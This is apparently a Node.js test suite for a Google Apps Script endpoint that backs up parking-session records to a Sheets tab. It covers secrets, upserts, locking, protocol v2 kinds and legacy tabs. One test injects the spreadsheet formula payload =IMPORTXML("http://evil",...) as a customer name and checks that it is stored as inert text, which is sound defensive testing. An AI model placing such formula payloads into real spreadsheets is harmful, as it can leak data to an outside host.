// Tests for cloud_sync/AppsScript.gs against an in-memory emulation of Sheets (see mock.js).
// Run: node tests/apps_script/backup.test.js
const fs = require("fs"), vm = require("vm"), assert = require("assert");
const { makeEnv } = require("./mock.js");
function load(file) {
  const env = makeEnv();
  vm.createContext(env);
  vm.runInContext(fs.readFileSync(file, "utf8").replace('"CHANGE_ME_TO_A_LONG_RANDOM_VALUE"', '"s3cret"'), env);
  return env;
}
const post = (env, rec, secret = "s3cret") => JSON.parse(env.doPost({ postData: { contents: JSON.stringify({ secret, record: rec }) } }).text);
const get = (env, token) => JSON.parse(env.doGet({ parameter: token ? { token } : {} }).text);
const base = { session_token: "tok1", ticket_id: "TKT-000001", customer_name: "Ana", plate: "ABC123", phone: "+57300", space_number: null,
  entry_timestamp: "2026-10-09T14:35:12.345678", exit_timestamp: null, duration_minutes: null, pricing_rule_name: "Std", pricing_type: "HOURLY",
  pricing_config_json: '{"first_hour_price":5000}', status: "PENDING_ASSIGNMENT", final_amount: null, currency: "COP" };

const path = require("path");
const file = process.argv[2] || path.join(__dirname, "..", "..", "cloud_sync", "AppsScript.gs");
let env = load(file);
assert.deepStrictEqual(post(env, base, "wrong"), { ok: false, error: "Invalid or missing secret" });
assert.deepStrictEqual(post(env, base), { ok: true });
let sheet = env.ss.getSheetByName("Sesiones");
assert(sheet, "named tab 'Sesiones' created (Sheet1 renamed)");
assert.strictEqual(env.ss.getSheets().length, 1);
assert.strictEqual(sheet.getLastRow(), 2, "header + 1 row");

// update same token -> same row, no duplicate
post(env, { ...base, space_number: "P07", status: "OCCUPIED" });
assert.strictEqual(sheet.getLastRow(), 2, "upsert keeps one row per session");
// second session -> row 3
post(env, { ...base, session_token: "tok2", plate: "XYZ999" });
assert.strictEqual(sheet.getLastRow(), 3);

// formulas and dates stay TEXT
post(env, { ...base, session_token: "tok3", customer_name: "=IMPORTXML(\"http://evil\",\"//a\")" });
const r = get(env, "tok3");
assert.strictEqual(r.record.customer_name, "=IMPORTXML(\"http://evil\",\"//a\")");
assert.strictEqual(typeof sheet.cells["4:3"], "string", "formula-looking name stored as a string, not a formula object");
const g1 = get(env, "tok1");
assert.strictEqual(g1.record.entry_timestamp, "2026-10-09T14:35:12.345678", "timestamp round-trips untouched (no Date conversion / TZ shift)");
assert.strictEqual(g1.record.space_number, "P07");
assert.strictEqual(g1.record.status, "OCCUPIED");
assert.deepStrictEqual(get(env, "nope"), { ok: false, error: "No session found for this token." });
assert.strictEqual(get(env).ok, true);
assert.strictEqual(env.log.lockWaits, env.log.lockReleases, "every lock released");
assert(env.log.lockWaits >= 4, "writes are serialised by the lock");

// protocol v2: `kind` is honoured. Sessions with an explicit kind work, pings
// answer without touching the sheet, and other record kinds are acknowledged
// and ignored (so ParkingManager marks them sent instead of retrying forever).
const postKind = (env, kind, rec, secret = "s3cret") =>
  JSON.parse(env.doPost({ postData: { contents: JSON.stringify({ secret, kind, record: rec }) } }).text);
const rowsBefore = sheet.getLastRow();
assert.deepStrictEqual(postKind(env, "ping", { protocol: 2 }), { ok: true, service: "google-sheet-backup" });
assert.deepStrictEqual(postKind(env, "audit", { uid: "a1", action: "LOGIN_OK" }), { ok: true, ignored: "audit" });
assert.deepStrictEqual(postKind(env, "monthly_event", { uid: "e1", direction: "IN" }), { ok: true, ignored: "monthly_event" });
assert.strictEqual(sheet.getLastRow(), rowsBefore, "ignored kinds never write a row");
assert.deepStrictEqual(postKind(env, "ping", {}, "wrong"), { ok: false, error: "Invalid or missing secret" }, "ping still checks the secret");
assert.deepStrictEqual(postKind(env, "session", { ...base, session_token: "tok-v2" }), { ok: true });
assert.strictEqual(sheet.getLastRow(), rowsBefore + 1, "explicit kind=session is stored");
// extra v2 fields in a session record are harmless to the sheet layout
assert.deepStrictEqual(postKind(env, "session", { ...base, session_token: "tok-v2", unit: "Torre 3 - 402", person_type: "RESIDENT" }), { ok: true });
assert.strictEqual(sheet.getLastRow(), rowsBefore + 1, "still one row per session");

// legacy layout: first tab already holds our header -> keep using it
env = load(file);
const legacy = env.ss.getSheets()[0];
legacy.appendRow(env.HEADERS);
legacy.appendRow(["old-token", "TKT-1", "Old", "OLD111", "", "P01", "2026-01-01T10:00:00", "", "", "R", "HOURLY", "{}", "OCCUPIED", "", "COP", "x"]);
assert.deepStrictEqual(post(env, { ...base, session_token: "old-token", status: "COMPLETED", final_amount: 8000 }), { ok: true });
assert.strictEqual(env.ss.getSheets().length, 1, "legacy tab reused, no new tab");
assert.strictEqual(legacy.getLastRow(), 2, "legacy row updated in place");

// foreign first tab with other data -> a new tab, the foreign data untouched
env = load(file);
env.ss.getSheets()[0].appendRow(["Form", "Responses"]);
post(env, base);
assert.strictEqual(env.ss.getSheets().length, 2);
assert.strictEqual(env.ss.getSheets()[0].getLastRow(), 1);
assert.strictEqual(env.ss.getSheetByName("Sesiones").getLastRow(), 2);
console.log("AppsScript.gs: all mock checks passed");
